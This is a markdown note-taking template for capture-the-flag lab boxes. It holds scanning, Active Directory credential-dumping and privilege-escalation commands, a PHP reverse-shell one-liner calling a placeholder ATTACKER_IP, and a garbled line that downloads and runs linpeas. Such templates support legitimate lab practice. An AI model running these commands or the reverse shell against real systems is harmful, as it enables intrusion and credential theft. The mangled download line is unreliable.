# 🗒️ Box Notes Template for inksec.io

> Use this to capture everything for each box. Duplicate this page per box and fill it in as you go. Keep raw commands in **Command Log** so future you can copy‑paste.

---

## 🧪 Machine Metadata

| Field | Value |
|---|---|
| Platform | HTB / THM / PG / VulnLab |
| Machine | `BOXNAME` |
| IP / Host | `10.x.x.x` (export as `$target`) |
| Difficulty | Easy / Medium / Hard |
| OS | Windows / Linux |
| Status | Active / Retired / Seasonal / Prep |
| Points | _optional_ |
| Creator(s) | _optional_ |
| Start Date | YYYY‑MM‑DD |
| Finish Date | YYYY‑MM‑DD |
| Writeup Path | `/CTF-Writeups/HTB/BOXNAME/README.md` |
| Proof Image | `https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/boxname.png` |

**TL;DR exploit chain**: _e.g., LFI → SSH key reuse → rbash escape → cap_dac_read_search → root_

---

## 🔎 Enumeration

### Quick Exports
```bash
export target=10.10.10.10
export RIP=$target
```

### Full Port Scan (save outputs)
```bash
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oA scans/rust_full
nmap -p- -T4 -oA scans/allports $target
nmap -sC -sV -p <top-ports-from-allports> -oA scans/enum $target
whatweb -a 3 http://$target | tee scans/whatweb.txt
```

### HTTP/HTTPS
```bash
gobuster dir -u http://$target -w /usr/share/wordlists/dirb/big.txt -x php,txt,html -o scans/gobuster.txt
ffuf -c -u http://$target/FUZZ -w /usr/share/wordlists/dirb/big.txt -r -o scans/ffuf_dirs.json
# vhost fuzz
ffuf -c -u http://$target -H "Host: FUZZ.$target" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o scans/ffuf_vhosts.json
# params
ffuf -c -u "http://$target/index.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o scans/ffuf_params.json
```

### SMB / Windows Enum
```bash
nmap -p 139,445 --script smb-enum* -oA scans/smb $target
enum4linux-ng -A $target | tee scans/enum4linux.txt
smbclient -L //$target -N | tee scans/smb_shares.txt
crackmapexec smb $target --shares
```

### LDAP / Kerberos / AD
```bash
# user enum (noisy → VPN lab ok)
kerbrute userenum --dc $target -d BOX.DOMAIN users.txt -o scans/kerbrute_users.txt
GetNPUsers.py -no-pass -dc-ip $target BOX.DOMAIN/ | tee scans/asrep.txt
GetUserSPNs.py -request -dc-ip $target BOX.DOMAIN/USER:PASS | tee scans/spns.txt
secretsdump.py -dc-ip $target BOX.DOMAIN/USER:HASH@dc.box.domain
```

### Databases
```bash
mysql -h $target -u root -p
psql -h $target -U postgres -W
```

### Misc
```bash
# tech fingerprint
wafw00f http://$target | tee scans/waf.txt
sslscan $target:443 | tee scans/ssl.txt
```

---

## 🧨 Exploitation

**Entry Vector**: _endpoint/port/CVE_

**Notes & Payloads**
```text
- Vulnerable param: ?id=, ?file=, X-Forwarded-For header etc.
- Payloads tried: <list>, working one: <final>
- Upload webshell path: /uploads/shell.php
```

**Credentials / Secrets Found**
```text
user:pass pairs, API keys, JWTs, config files
```

**Reverse Shell**
```bash
# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# nc listener
rlwrap -cAr nc -lvnp 4444
```

---

## 📈 Privilege Escalation (Linux)

Checklist:
- [ ] `id; whoami; hostname; ip a; ss -tulpn`
- [ ] `sudo -l` (GTFOBins)
- [ ] SUID: `find / -perm -4000 -type f 2>/dev/null`
- [ ] Cron / timers: `ls -la /etc/cron*`; `systemctl list-timers`
- [ ] Writable paths in `$PATH`
- [ ] Capabilities: `getcap -r / 2>/dev/null`
- [ ] Services & configs: `ps aux`, `netstat -tunlp`
- [ ] Kernel & exploits (last resort): `uname -a`
- [ ] LinPEAS/LinEnum

Common one‑liners:
```bash
(find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null) | tee suid.txt
GET https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
town -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh
```

---

## 📊 Privilege Escalation (Windows)

Checklist:
- [ ] `whoami /priv`; `whoami /groups`
- [ ] `systeminfo` (hotfixes) / `wmic qfe list`
- [ ] Unquoted services / weak service perms
- [ ] AlwaysInstallElevated
- [ ] Scheduled tasks
- [ ] Interesting shares: `dir /s /b C:\*.kdbx *.config *.xml`
- [ ] SharpHound/BloodHound for AD paths
- [ ] `winPEASx64.exe`

Useful commands:
```powershell
# upload tools via evil-winrm
upload winPEASx64.exe C:\Users\Public\winPEASx64.exe
.\n# service perms
sc qc <ServiceName>
sc sdshow <ServiceName>
```

---

## 📦 Loot & Artifacts

- Hashes / Tickets: __
- Keys / Certs: __
- DB dumps: __
- Screenshots / Proofs saved to: `proofs/BOXNAME/`

**Flags**
```text
user.txt: HTB{xxxxxxxxxxxxxxxxxxxx}  # show ~50% only in public notes
root.txt: HTB{yyyyyyyyyyyyyyyyyyyy}
```

---

## 🧹 Post‑Exploitation & Cleanup

- [ ] Remove uploaded shells/tools
- [ ] Restore permissions / configs
- [ ] Clear temp files & bash history (if allowed by rules)

---

## 🧠 Lessons Learned

- What worked well: __
- What slowed me down: __
- New techniques/tools to keep: __

---

## 📜 Command Log (raw, append as you go)

```bash
# Put everything here verbatim so future you can re‑run quickly.
# Example start:
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full
whatweb -a 3 http://$target
ffuf -c -u http://$target/FUZZ -w /usr/share/wordlists/dirb/big.txt -r
```

---

## 🔖 Snippets for inksec.io (copy‑paste)

### Retired Box Snippet (Featured Writeups)
```markdown
🔓 **BOXNAME** (HTB, Easy, Linux) — LFI → SSH key → rbash escape → cap_dac_read_search → **Root**  
🧾 Write‑up: /CTF-Writeups/HTB/BOXNAME/README.md  
🖼️ Proof: https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/boxname.png
```

### Active/Seasonal Box Snippet
```markdown
⏳ **BOXNAME** (HTB Seasonal, Windows) — NTLMv2 crack → Shadow Credentials → ADCS ESC1 → Pass‑the‑Cert → **DA**
```

### README.md Header Template
```markdown
# 🧪 BOXNAME — Writeup (inksec.io)

**Platform:** Hack The Box  
**IP:** $target  
**Difficulty:** Easy  
**OS:** Linux  
**Status:** Retired  
**Proof Image:** https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/boxname.png

## Overview
Short summary of the exploit chain and key takeaways.

## Enumeration
(ports, services, directories, creds, etc.)

## Exploitation
(steps, payloads, shells, creds)

## Privilege Escalation
(method, evidence, commands)

## Proofs
```

### Redacted Flags Block
```text
user.txt: HTB{abc123...REDACTED}
root.txt: HTB{def456...REDACTED}
```

---

## 📚 Quick References

- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- PEASS-ng: https://github.com/carlospolop/PEASS-ng

> Tip: keep proofs and README filenames consistent with `BOXNAME` for clean repo diffs.

